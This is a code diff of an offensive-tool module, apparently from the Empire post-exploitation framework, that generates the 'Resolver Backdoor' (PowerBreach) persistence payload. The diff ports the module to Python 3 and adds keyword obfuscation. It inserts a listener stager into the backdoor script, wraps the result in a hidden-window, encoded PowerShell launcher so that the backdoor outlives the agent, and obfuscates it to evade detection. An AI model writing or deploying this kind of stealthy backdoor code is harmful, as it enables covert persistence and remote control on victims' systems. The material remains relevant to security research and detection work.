@@ -1,7 +1,13 @@
+from __future__ import print_function
+
 import os
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -11,6 +17,10 @@ class Module:
             'Author': ['@sixdub'],
 
             'Description': ('Starts the Resolver Backdoor.'),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1015'],
 
             'Background' : False,
 
@@ -131,7 +141,7 @@ Invoke-ResolverBackdoor"""
 
         if not self.mainMenu.listeners.is_listener_valid(listenerName):
             # not a valid listener, return nothing for the script
-            print helpers.color("[!] Invalid listener: " + listenerName)
+            print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
 
         else:
@@ -147,9 +157,8 @@ Invoke-ResolverBackdoor"""
                 return ""
             else:
                 script = script.replace("REPLACE_LAUNCHER", stagerCode)
-                script = script.encode('ascii', 'ignore')
         
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
@@ -168,11 +177,13 @@ Invoke-ResolverBackdoor"""
             f.write(script)
             f.close()
 
-            print helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile)
+            print(helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile))
             return ""
 
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
@@ -181,7 +192,10 @@ Invoke-ResolverBackdoor"""
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
-        scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+
         if obfuscate:
-            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
-        return scriptLauncher
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
+        return script
